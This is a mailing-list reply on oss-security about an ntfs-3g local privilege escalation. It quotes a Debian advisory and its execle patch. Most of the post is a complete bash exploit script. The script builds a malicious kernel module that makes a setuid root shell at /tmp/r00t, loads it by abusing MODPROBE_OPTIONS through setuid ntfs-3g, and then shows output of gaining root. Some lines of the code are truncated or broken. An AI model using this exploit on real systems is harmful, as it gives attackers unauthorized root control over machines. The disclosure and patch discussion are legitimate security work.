  oss-security - Re: ntfs-3g: modprobe influence  vulnerability via environment variables            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [day] [month] [year] [list]  Date: Fri, 3 Feb From: Kristian Erik Hermansen <kristian.hermansen@...il.com> To: oss-security@...ts.openwall.com Subject: Re: ntfs-3g: modprobe influence  vulnerability via environment variables  #!/bin/bash echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" echo "@  PoC by Kristian Erik Hermansen  @" echo "@  ntfs-3g local privilege escalation to root     @" echo "@  Credits to Google Project Zero                 @" echo "@  Affects: Debian Ubuntu, Gentoo, others  @" echo "@  Tested: Debian 9 (Stretch)                     @" echo "@  Date:                               @" echo "@  Link: https://goo.gl/A9I8Vq                    @" echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" echo "[*] Gathering environment info ..." cwd="$(pwd)" un="$(uname -r)" dlm="$(pwd)/lib/modules" dkf="$(pwd)/kernel/fs" echo "[*] Creating kernel hijack directories ..." mkdir -p "${dlm}" mkdir -p "${dkf}" echo "[*] Forging symlinks ..." ln -sf "${cwd}" "${dlm}/${un}" ln -sf "${cwd}" "${dkf}/fuse" ln -sf fuse.ko echo "[*] Pulling in deps ... " echo "[*] Building kernel module ... "  cat << 'EOF' > #include <linux/module.h>  MODULE_LICENSE("CC"); MODULE_AUTHOR("kristian erik hermansen MODULE_DESCRIPTION("PoC for from Google Project Zero");  int init_module(void) {   printk(KERN_INFO "[!] Exploited successfully; may want to patch your system!\n");   char *envp[] = { "HOME=/tmp", NULL };   char *argv[] = { "/bin/sh", "-c", "/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t", NULL };   call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);   char *argvv[] = { "/bin/sh", "-c", "/sbin/rmmod NULL };   call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);   return 0; }  void cleanup_module(void) {   printk(KERN_INFO "[*] exploit unloading ...\n"); } EOF  cat << 'EOF' > Makefile obj-m +=  all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules  clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean EOF  make 1>/dev/null 2>/dev/null || echo "[-] FAILED: your need make / build tools" cp "/lib/modules/${un}/modules.dep.bin" . || echo "[-] FAILED: linux-image location non-default?" MODPROBE_OPTIONS="-v -d ${cwd}" ntfs-3g /dev/null /dev/null 1>/dev/null 2>/dev/null /tmp/r00t -c 'whoami' | egrep -q 'root' && echo "[+] SUCCESS: You have root. Don't be evil :)" /tmp/r00t  echo << 'EOF' $ whoami user $ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @  PoC by Kristian Erik Hermansen  @ @  ntfs-3g local privilege escalation to root     @ @  Credits to Google Project Zero                 @ @  Affects: Debian Ubuntu, Gentoo, others  @ @  Tested: Debian 9 (Stretch)                     @ @  Date:                               @ @  Link: https://goo.gl/A9I8Vq                    @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ [*] Gathering environment info ... [*] Creating kernel hijack directories ... [*] Forging symlinks ... [*] Pulling in deps ... [*] Building kernel module ... [+] SUCCESS: You have root. Don't be evil :) # whoami root EOF   On Tue, Jan 31, at PM, Laszlo Boszormenyi (GCS) <gcs@...ian.org> wrote: > Hi, > > Jann Horn, Project Zero (Google) discovered that ntfs-3g, a read-write > NTFS driver for FUSE does not not scrub the environment before > executing modprobe to load the fuse module. This influence the behavior > of modprobe (MODPROBE_OPTIONS environment variable, --config and > --dirname options) potentially allowing for local root privilege > escalation if ntfs-3g is installed setuid. This is the case for Debian, > Ubuntu and probably Gentoo. > > This problem is in the source since maybe before. > The fix is easy, use execle instead of execl and pass NULL as > environment variables. > -- cut -- > --- ntfs-3g/src/lowntfs-3g.c.ref        > +++ ntfs-3g/src/lowntfs-3g.c    > @@ @@ >         struct stat st; >         pid_t pid; >         const char *cmd = "/sbin/modprobe"; > +       char *env = (char*)NULL; >         struct timespec req = { 0, };   /* msec */ >         fuse_fstype fstype; > >         if (!stat(cmd, &st) && !geteuid()) { >                 pid = fork(); >                 if (!pid) { > -                       execl(cmd, cmd, "fuse", NULL); > +                       execle(cmd, cmd, "fuse", NULL, &env); >                         _exit(1); >                 } else if (pid != -1) >                         waitpid(pid, NULL, 0); > --- ntfs-3g/src/ntfs-3g.c.ref   > +++ ntfs-3g/src/ntfs-3g.c       > @@ @@ >         struct stat st; >         pid_t pid; >         const char *cmd = "/sbin/modprobe"; > +       char *env = (char*)NULL; >         struct timespec req = { 0, };   /* msec */ >         fuse_fstype fstype; > >         if (!stat(cmd, &st) && !geteuid()) { >                 pid = fork(); >                 if (!pid) { > -                       execl(cmd, cmd, "fuse", NULL); > +                       execle(cmd, cmd, "fuse", NULL, &env); >                         _exit(1); >                 } else if (pid != -1) >                         waitpid(pid, NULL, 0); > -- cut -- > > is assigned to this issue by Salvatore Bonaccorso, > Debian Security Team. > > Regards, > Laszlo/GCS    --  Regards,  Kristian Erik Hermansen https://www.linkedin.com/in/kristianhermansen https://profiles.google.com/kristianerikhermansen  View attachment of type "text/plain" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      